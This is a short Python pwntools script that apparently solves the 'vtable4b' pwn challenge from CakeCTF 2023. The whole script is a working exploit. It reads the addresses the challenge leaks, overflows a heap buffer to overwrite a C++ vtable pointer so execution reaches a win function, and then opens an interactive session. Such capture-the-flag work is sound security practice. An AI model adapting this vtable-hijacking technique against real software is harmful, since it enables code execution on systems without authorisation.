#!/usr/bin/python3

from pwn import *

c = remote('vtable4b.2023.cakectf.com', 9000)


c.recvuntil("<win> = ")
win = c.recvline()

c.sendline(b"3")
prompt = c.recvuntil("vtable for Cowsay")
ptr = prompt.splitlines()[-3].split(b"|")[0].strip()
log.info("win" + hex(int(win, 16)))
log.info("ptr" + hex(int(ptr, 16)))
vtable_address = prompt.splitlines()[-1].split(b"|")[1].split(b"|")[0].strip()
log.info("vtable" + hex(int(vtable_address, 16)))

payload = b"a" * 24 + p64(int(win, 16), endian='little')
payload += p64(int(ptr, 16), endian='little')
payload += p64(int(vtable_address, 16), endian='little')
c.sendline(b"2")
c.sendline(payload)
c.interactive()

